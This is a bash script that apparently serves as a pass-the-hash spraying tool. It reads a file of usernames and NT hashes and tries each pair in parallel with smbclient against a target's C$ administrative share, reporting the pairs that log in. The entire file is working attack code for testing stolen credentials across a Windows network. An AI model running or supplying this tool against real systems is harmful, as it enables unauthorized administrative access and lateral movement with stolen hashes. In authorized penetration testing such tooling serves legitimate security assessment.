#!/bin/bash

function check(){ # $1 is domain $2 is username $3 is hash
    smbclient --pw-nt-hash -U "$1/$2%$3" "\\\\$4\\C\$" 1>/dev/null 2>&1 && echo "[+] Found : $1:$2";
}

if [[ -z "$1" || -z "$2" || -z "$3" || ! -f "$3"  ]];then
    echo "Usage: $0 domain ip filename with inside (user:hash)";
    exit 1;
fi

for line in $(cat "$3");do 
    username=$(echo $line | cut -d ':' -f 1);
    password=$(echo $line | cut -d ':' -f 2);
    check "$1" "$username" "$password" "$2" &
done

wait -f